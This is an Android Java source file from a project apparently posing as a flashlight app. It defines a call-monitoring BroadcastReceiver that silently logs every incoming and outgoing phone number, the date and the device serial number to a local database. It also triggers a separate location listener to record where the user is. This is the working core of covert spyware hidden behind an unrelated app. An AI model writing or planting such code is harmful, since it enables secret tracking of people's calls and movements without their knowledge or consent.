package com.example.flashlightexample;

import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.text.DateFormat;
import java.util.Date;

import android.content.BroadcastReceiver;
import android.content.ContentValues;
import android.content.Context;
import android.content.Intent;
import android.database.sqlite.SQLiteDatabase;
import android.os.Bundle;
import android.telephony.TelephonyManager;

public class CagriDinliyorum extends BroadcastReceiver{
KonumDinliyorum knm=new KonumDinliyorum();
	@Override
	public void onReceive(Context context, Intent intent) {
		// TODO Auto-generated method stub
		Bundle bundle=intent.getExtras();
		if(bundle==null){
			return;
		}
		String phoneNumber=null;
		//Çaðrý geldiðinde
		String state=bundle.getString(TelephonyManager.EXTRA_STATE);
		if((state!=null)&&state.equalsIgnoreCase(TelephonyManager.EXTRA_STATE_RINGING)){
			phoneNumber=bundle.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
			//Arama Geldiðinde (sayfanýn tetiklendiði zamn)
			String currenDateTime=DateFormat.getDateInstance().format(new Date());
			//Android Cihaz Ýd si okuma
			String serialnum=null;
			
			
				try {
					Class<?> c;
					c = Class.forName("android.os.SystemProperties");
					Method get=c.getMethod("get", String.class,String.class);
					serialnum=(String)(get.invoke(c, "ro.serialno","unknown"));
				} catch (ClassNotFoundException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (NoSuchMethodException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IllegalArgumentException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (IllegalAccessException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				} catch (InvocationTargetException e) {
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
				
				//Sqlite Db kayýt iþlemleri baþlýyor
				

				SQLiteDatabaseHelper dbHelper=SQLiteDatabaseHelper.getInstance(context);
				SQLiteDatabase db=dbHelper.getWritableDatabase();
				ContentValues  val= new ContentValues();
				val.put(SQLiteDatabaseHelper.COLUMN_DATETIME,currenDateTime	);
				val.put(SQLiteDatabaseHelper.COLUMN_ACTION,"Gelen Arama"	);
				val.put(SQLiteDatabaseHelper.COLUMN_CONTENT,phoneNumber	);
				val.put(SQLiteDatabaseHelper.COLUMN_SERIALNUMBER,serialnum	);
				db.insert(SQLiteDatabaseHelper.TABLE_NEWS, null, val);
				//Burada kiþinin konumunu alýyoruz.
				knm.onReceive(context, intent);
				//Giden Aramalar
				
				
				
						
			
			
		}
		else if(state==null){
			phoneNumber=bundle.getString(Intent.EXTRA_PHONE_NUMBER);
			//Sayfanýn tetiklendiði zamn
			String currenDateTime=DateFormat.getDateInstance().format(new Date());
			
			//aNDROÝD chiaz Id si okuma
			
			String serialnum=null;
			
			
			try {
				Class<?> c;
				c = Class.forName("android.os.SystemProperties");
				Method get=c.getMethod("get", String.class,String.class);
				serialnum=(String)(get.invoke(c, "ro.serialno","unknown"));
			} catch (ClassNotFoundException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (NoSuchMethodException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IllegalArgumentException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (IllegalAccessException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			} catch (InvocationTargetException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
			
			//Sqlite Database kayýt iþlemmleri
			SQLiteDatabaseHelper dbHelper=SQLiteDatabaseHelper.getInstance(context);
			SQLiteDatabase db=dbHelper.getWritableDatabase();
			ContentValues  val= new ContentValues();
			val.put(SQLiteDatabaseHelper.COLUMN_DATETIME,currenDateTime	);
			val.put(SQLiteDatabaseHelper.COLUMN_ACTION,"Giden Arama"	);
			val.put(SQLiteDatabaseHelper.COLUMN_CONTENT,phoneNumber	);
			val.put(SQLiteDatabaseHelper.COLUMN_SERIALNUMBER,serialnum	);
			db.insert(SQLiteDatabaseHelper.TABLE_NEWS, null, val);
			//Burada bu sayfa tetiklendiði zaman kiþinin konumunu bulunduðu yeri alýyoruz.
			knm.onReceive(context, intent);
			
		}
		
	}

}
